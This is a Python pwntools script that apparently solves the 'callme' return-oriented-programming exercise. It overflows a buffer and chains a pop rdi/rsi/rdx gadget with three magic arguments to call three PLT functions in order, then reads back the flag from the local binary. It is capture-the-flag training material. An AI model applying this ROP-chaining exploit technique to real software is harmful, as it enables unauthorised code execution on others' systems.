from pwn import *


callme_one_plt = pack(0x00400720, 64)
callme_two_plt = pack(0x00400740, 64)
callme_three_plt = pack(0x004006f0, 64)

arg1 = pack(0xdeadbeefdeadbeef, 64)
arg2 = pack(0xcafebabecafebabe, 64)
arg3 = pack(0xd00df00dd00df00d, 64)

# rdi, rsi, rdx
# 0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret
pop_args_gadget = pack(0x000000000040093c, 64)

payload = b""
payload += b"A"*(54-8-2-4)
payload += pop_args_gadget
payload += arg1
payload += arg2
payload += arg3
payload += callme_one_plt
payload += pop_args_gadget  # ret
payload += arg1
payload += arg2
payload += arg3
payload += callme_two_plt
payload += pop_args_gadget  # ret
payload += arg1
payload += arg2
payload += arg3
payload += callme_three_plt

write("/tmp/docgil", payload)

p = process(["callme"])
r = p.recv().decode("utf-8")
log.info(f"r: {r}")

p.send(payload)
flag = p.recvall().decode("utf-8")
log.info(f"flag: {flag}")


